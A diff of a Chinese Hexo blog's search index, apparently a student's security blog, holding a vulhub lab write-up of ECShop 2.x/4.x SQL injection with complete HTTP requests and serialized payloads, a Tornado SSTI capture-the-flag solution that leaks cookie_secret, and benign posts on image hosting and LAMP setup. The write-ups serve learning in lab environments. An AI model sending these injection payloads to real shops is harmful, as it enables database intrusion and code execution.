</span>45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<img src="https://images.gaifagafin.top/202311082307207.png" style="zoom: 67%;" />
+
+<h3 id="ecshop4-x漏洞利用"><a href="#ecshop4-x漏洞利用" class="headerlink" title="ecshop4.x漏洞利用"></a>ecshop4.x漏洞利用</h3><p>漏洞环境搭建同前面一样</p>
+<p>参考文档:<a href="https://vulhub.org/#/environments/ecshop/collection_list-sqli/">https://vulhub.org/#/environments/ecshop/collection_list-sqli/</a></p>
+<p>要利用漏洞首先要注册为一个普通用户，信息随便填</p>
+<img src="https://images.gaifagafin.top/202311082307371.png" style="zoom:67%;" />
+
+<p>根据参考文档抓包，在包里添加字段</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html">X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/user.php?act=collection_list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:5003<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ECS[visit_times]=4; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=53ae5332f431fa0b2d246a06d90dbf70b68310ff; real_ipd=172.22.0.1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>
+
+<p>回显界面如下，得到当前数据库用户</p>
+<img src="https://images.gaifagafin.top/202311082307656.png" style="zoom:80%;" />
 
 ]]></content>
       <categories>
@@ -1608,99 +1608,6 @@
       <tags>
         <tag>vulhub</tag>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于建站</title>
-    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
-    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
-<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
-<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
-<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
-<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>建站</tag>
-        <tag>图床</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>图床图片测试</title>
-    <url>/2023/10/29/%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<p><img src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
-<p><img src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
-<p><img src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
-<p><img src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
-<p><img src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
-<p><img src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
-<p><img src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
-<p><img src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
-<p><img src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>picture</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界 easytornado</title>
-    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/</url>
-    <content><![CDATA[<img src="https://images.gaifagafin.top/202311051129114.png" style="zoom:67%;" />
-
-<p>进入靶机，页面为</p>
-<p><img src="https://images.gaifagafin.top/202311051129889.png"></p>
-<p>打开&#x2F;flag.txt,提示</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">flag <span class="hljs-keyword">in</span> /fllllllllllllag<br></code></pre></td></tr></table></figure>
-
-<p>打开&#x2F;welcome.txt,提示</p>
-<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">render</span><br></code></pre></td></tr></table></figure>
-
-<p>在<code>tornado</code>中render为渲染作用</p>
-<p>打开&#x2F;hints.txt,提示</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span><br></code></pre></td></tr></table></figure>
-
-<p>提示的是<strong>filehash参数的计算方法</strong></p>
-<p>通过上面三个的分析，可以得出，我们需要构建一个url为</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:62044/file?<br>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))<br></code></pre></td></tr></table></figure>
-
-<p>fllllllllllllag的md5值为<code>594cb6af684ad354b4a59ac496473990</code></p>
-<p>接下来要找到cookie_secret</p>
-<hr>
-<p>cookie_secret获取方法如下：</p>
-<p>render是一个类似模板的东西，可以使用不同的参数来访问网页<br>在tornado模板中，存在一些可以访问的快速对象，例如<br><code>&#123;&#123; escape(handler.settings[“cookie”]) &#125;&#125;</code></p>
-<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
-<p>而RequestHandler.settings又指向self.application.settings</p>
-<p>所有handler.settings就指向RequestHandler.application.settings了！</p>
-<p>大概就是说，这里面就是我们一下环境变量，我们正是从这里获取的cookie_secret</p>
-<p>原文链接：<a href="https://blog.csdn.net/yuanxu8877/article/details/128079863">https://blog.csdn.net/yuanxu8877/article/details/128079863</a></p>
-<hr>
-<p>首先我们url输入<code>http://61.147.171.105:62044/file?filename=/flag.txt&amp;filehash=</code> 进入错误页面</p>
-<p><img src="https://images.gaifagafin.top/202311051130450.png"></p>
-<p>输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;1&#125;&#125;</code></p>
-<p>页面返回1，说明存在漏洞，在此处直接注入</p>
-<p>url输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
-<p>回显</p>
-<p><img src="https://images.gaifagafin.top/202311061712383.png"></p>
-<p>得到cookie_secret值:<code>4beb94e3-3a69-4960-92ab-f83221330eec</code></p>
-<p>编写脚本获取filehash</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_md5</span>(<span class="hljs-params">content</span>):<br>    md5 = hashlib.md5()<br>    md5.update(content.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br>filename=<span class="hljs-string">&quot;/fllllllllllllag&quot;</span><br>cookie_secret=<span class="hljs-string">&quot;4beb94e3-3a69-4960-92ab-f83221330eec&quot;</span><br>no_md5_filehash=cookie_secret+get_md5(filename)<br>filehash=get_md5(no_md5_filehash)<br><span class="hljs-built_in">print</span>(filehash)<br></code></pre></td></tr></table></figure>
-
-<p>得到filehash:<code>835b3dbf7a8aabcf5b566e0c276b610c</code></p>
-<p>payload:<code>http://61.147.171.105:62044/file?filename=/fllllllllllllag&amp;filehash=835b3dbf7a8aabcf5b566e0c276b610c</code></p>
-<p>得到flag:<code>flag&#123;3f39aea39db345769397ae895edb9c70&#125;</code></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>攻防世界</tag>
       </tags>
   </entry>
   <entry>
@@ -1907,6 +1814,99 @@
       </tags>
   </entry>
   <entry>
+    <title>图床图片测试</title>
+    <url>/2023/10/29/%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<p><img src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
+<p><img src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
+<p><img src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
+<p><img src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
+<p><img src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
+<p><img src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
+<p><img src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
+<p><img src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
+<p><img src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>picture</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于建站</title>
+    <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
+    <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
+<p>免费的但不完全免费的聚合图床，路过图床，ImgUrl，SM.MS…</p>
+<p>使用cloudflare R2搭建图床:<a href="https://testerhome.com/topics/36077">https://testerhome.com/topics/36077</a></p>
+<p>使用cloudflare+backblaze_b2搭建图床:<a href="https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80">https://blog.ostdb.info/54300/#%E5%89%8D%E8%A8%80</a></p>
+<p>最终还是选用cloudflare R2，因为它对于浏览量不高的个人博主来说确实是纯纯白嫖了</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
+        <tag>图床</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界 easytornado</title>
+    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/</url>
+    <content><![CDATA[<img src="https://images.gaifagafin.top/202311051129114.png" style="zoom:67%;" />
+
+<p>进入靶机，页面为</p>
+<p><img src="https://images.gaifagafin.top/202311051129889.png"></p>
+<p>打开&#x2F;flag.txt,提示</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">flag <span class="hljs-keyword">in</span> /fllllllllllllag<br></code></pre></td></tr></table></figure>
+
+<p>打开&#x2F;welcome.txt,提示</p>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">render</span><br></code></pre></td></tr></table></figure>
+
+<p>在<code>tornado</code>中render为渲染作用</p>
+<p>打开&#x2F;hints.txt,提示</p>
+<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span><br></code></pre></td></tr></table></figure>
+
+<p>提示的是<strong>filehash参数的计算方法</strong></p>
+<p>通过上面三个的分析，可以得出，我们需要构建一个url为</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:62044/file?<br>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))<br></code></pre></td></tr></table></figure>
+
+<p>fllllllllllllag的md5值为<code>594cb6af684ad354b4a59ac496473990</code></p>
+<p>接下来要找到cookie_secret</p>
+<hr>
+<p>cookie_secret获取方法如下：</p>
+<p>render是一个类似模板的东西，可以使用不同的参数来访问网页<br>在tornado模板中，存在一些可以访问的快速对象，例如<br><code>&#123;&#123; escape(handler.settings[“cookie”]) &#125;&#125;</code></p>
+<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
+<p>而RequestHandler.settings又指向self.application.settings</p>
+<p>所有handler.settings就指向RequestHandler.application.settings了！</p>
+<p>大概就是说，这里面就是我们一下环境变量，我们正是从这里获取的cookie_secret</p>
+<p>原文链接：<a href="https://blog.csdn.net/yuanxu8877/article/details/128079863">https://blog.csdn.net/yuanxu8877/article/details/128079863</a></p>
+<hr>
+<p>首先我们url输入<code>http://61.147.171.105:62044/file?filename=/flag.txt&amp;filehash=</code> 进入错误页面</p>
+<p><img src="https://images.gaifagafin.top/202311051130450.png"></p>
+<p>输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;1&#125;&#125;</code></p>
+<p>页面返回1，说明存在漏洞，在此处直接注入</p>
+<p>url输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>回显</p>
+<p><img src="https://images.gaifagafin.top/202311061712383.png"></p>
+<p>得到cookie_secret值:<code>4beb94e3-3a69-4960-92ab-f83221330eec</code></p>
+<p>编写脚本获取filehash</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_md5</span>(<span class="hljs-params">content</span>):<br>    md5 = hashlib.md5()<br>    md5.update(content.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br>filename=<span class="hljs-string">&quot;/fllllllllllllag&quot;</span><br>cookie_secret=<span class="hljs-string">&quot;4beb94e3-3a69-4960-92ab-f83221330eec&quot;</span><br>no_md5_filehash=cookie_secret+get_md5(filename)<br>filehash=get_md5(no_md5_filehash)<br><span class="hljs-built_in">print</span>(filehash)<br></code></pre></td></tr></table></figure>
+
+<p>得到filehash:<code>835b3dbf7a8aabcf5b566e0c276b610c</code></p>
+<p>payload:<code>http://61.147.171.105:62044/file?filename=/fllllllllllllag&amp;filehash=835b3dbf7a8aabcf5b566e0c276b610c</code></p>
+<p>得到flag:<code>flag&#123;3f39aea39db345769397ae895edb9c70&#125;</code></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>CTF_Writeup</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界-Web_python_template_injection</title>
     <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
     <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
@@ -1954,6 +1954,65 @@
         <tag>Writeup</tag>
         <tag>攻防世界</tag>
         <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次搭建LAMP web环境</title>
+    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
+<p>终端输入<code>php -v</code>查看PHP版本</p>
+<p><img src="https://images.gaifagafin.top/202311051105539.png"></p>
+<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
+<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
+<p><img src="https://images.gaifagafin.top/202311051105283.png"></p>
+<p><img src="https://images.gaifagafin.top/202311051105413.png"></p>
+<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
+<p><img src="https://images.gaifagafin.top/202311051105653.png"></p>
+<p><img src="https://images.gaifagafin.top/202311051105983.png"></p>
+<p>服务正常启动</p>
+<p>接下来在网站测试服务是否可用</p>
+<p>linux浏览器输入localhost，若回显页面</p>
+<p><img src="https://images.gaifagafin.top/202311051105582.png"></p>
+<p>说明Apache服务正常</p>
+<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
+<p><img src="https://images.gaifagafin.top/202311051105350.png"></p>
+<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
+<p><img src="https://images.gaifagafin.top/202311051106523.png"></p>
+<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
+<p><img src="https://images.gaifagafin.top/202311051106180.png"></p>
+<p>以上做完说明web环境被成功搭建</p>
+<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
+<p><img src="https://images.gaifagafin.top/202311051106639.png"></p>
+<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106325.png"></p>
+<p>输入<code>docker images</code>查看下载的镜像</p>
+<p><img src="https://images.gaifagafin.top/202311051106503.png"></p>
+<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
+<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106900.png"></p>
+<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
+<p><img src="https://images.gaifagafin.top/202311051106366.png"></p>
+<p>和之前一样开启Apache和MySQL服务</p>
+<p><img src="https://images.gaifagafin.top/202311051106049.png"></p>
+<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106627.png"></p>
+<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
+<p><img src="https://images.gaifagafin.top/202311051106455.png"></p>
+<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
+<p><img src="https://images.gaifagafin.top/202311051106861.png"></p>
+<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
+<p><img src="https://images.gaifagafin.top/202311051107831.png"></p>
+<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
+<p><img src="https://images.gaifagafin.top/202311051107278.png"></p>
+<p>以上做完则成功在docker中搭建了lamp web环境</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>LAMP</tag>
+        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
@@ -2435,65 +2494,6 @@
       <tags>
         <tag>CTF</tag>
         <tag>SSTI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记一次搭建LAMP web环境</title>
-    <url>/2023/11/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%90%AD%E5%BB%BALAMP%20web%E7%8E%AF%E5%A2%83/</url>
-    <content><![CDATA[<h1 id="搭建LAMP-web环境"><a href="#搭建LAMP-web环境" class="headerlink" title="搭建LAMP web环境"></a>搭建LAMP web环境</h1><h2 id="在虚拟机搭建web环境"><a href="#在虚拟机搭建web环境" class="headerlink" title="在虚拟机搭建web环境"></a>在虚拟机搭建web环境</h2><p>我的虚拟机系统是kali linux,里面已经有了Apache2和MySQL和PHP的环境</p>
-<p>终端输入<code>php -v</code>查看PHP版本</p>
-<p><img src="https://images.gaifagafin.top/202311051105539.png"></p>
-<p>终端输入<code>service Apache2 start</code> 启动Apache服务</p>
-<p>终端输入<code>service MySQL start</code> 启动MySQL服务</p>
-<p><img src="https://images.gaifagafin.top/202311051105283.png"></p>
-<p><img src="https://images.gaifagafin.top/202311051105413.png"></p>
-<p>然后终端分别输入<code>service Apache2 status</code>和<code>service MySQL status</code>查看服务状态</p>
-<p><img src="https://images.gaifagafin.top/202311051105653.png"></p>
-<p><img src="https://images.gaifagafin.top/202311051105983.png"></p>
-<p>服务正常启动</p>
-<p>接下来在网站测试服务是否可用</p>
-<p>linux浏览器输入localhost，若回显页面</p>
-<p><img src="https://images.gaifagafin.top/202311051105582.png"></p>
-<p>说明Apache服务正常</p>
-<p>接下来测试PHP服务，终端输入<code>cd /var/www/html</code></p>
-<p><img src="https://images.gaifagafin.top/202311051105350.png"></p>
-<p>在此目录下创建一个index.php文件，内容是phpinfo，输入<code>echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; index.php</code>(要在root权限下)</p>
-<p><img src="https://images.gaifagafin.top/202311051106523.png"></p>
-<p>接下来在浏览器输入<code>localhost/index.php</code>,成功看到回显，说明PHP服务正常</p>
-<p><img src="https://images.gaifagafin.top/202311051106180.png"></p>
-<p>以上做完说明web环境被成功搭建</p>
-<h2 id="在docker里搭建LAMP"><a href="#在docker里搭建LAMP" class="headerlink" title="在docker里搭建LAMP"></a>在docker里搭建LAMP</h2><p>在docker搭建lamp web环境，我这里选择拉取网上已经集成了MySQL服务和Apache服务的镜像(root权限下运行)</p>
-<p><img src="https://images.gaifagafin.top/202311051106639.png"></p>
-<p>这里我选择linode&#x2F;lamp,输入<code>docker pull linode/lamp</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106325.png"></p>
-<p>输入<code>docker images</code>查看下载的镜像</p>
-<p><img src="https://images.gaifagafin.top/202311051106503.png"></p>
-<p>输入<code>docker run -tid -p 8080:80 -p 3309:3306 -v /var/www/html:/var/www/html --name lamp linode/lamp /bin/bash</code>创建容器(-p 参数是指定端口映射 ，-v参数是指定目录映射，–name 为此容器创建名字)</p>
-<p>创建成功后查看正在运行的容器<code>docker ps</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106900.png"></p>
-<p>输入<code>docker exec -it 16b /bin/bash</code>进入容器(16b为容器id前3位)</p>
-<p><img src="https://images.gaifagafin.top/202311051106366.png"></p>
-<p>和之前一样开启Apache和MySQL服务</p>
-<p><img src="https://images.gaifagafin.top/202311051106049.png"></p>
-<p>在浏览器访问<code>localhost:8080</code>,如果出现无法访问的情况，则需要重启docker服务(exit退出容器)，退出容器后终端输入<code>systemctl restart docker</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106627.png"></p>
-<p>再<code>docker start 容器id</code>，重复开启Apache和MySQL服务过程，在浏览器访问<code>localhost:8080</code>页面回显证明容器中的Apache服务成功运行</p>
-<p><img src="https://images.gaifagafin.top/202311051106455.png"></p>
-<p>接下来测试容器中PHP服务，容器中输入<code>cd var/www/example.com/public_html</code></p>
-<p><img src="https://images.gaifagafin.top/202311051106861.png"></p>
-<p>输入<code>&quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; 1.php</code>将测试php文件写入当前目录下</p>
-<p><img src="https://images.gaifagafin.top/202311051107831.png"></p>
-<p>浏览器输入<code>http://localhost:8080/1.php</code>访问测试php文件，看到回显，说明PHP服务也正常</p>
-<p><img src="https://images.gaifagafin.top/202311051107278.png"></p>
-<p>以上做完则成功在docker中搭建了lamp web环境</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>LAMP</tag>
-        <tag>环境</tag>
       </tags>
   </entry>
   <entry>
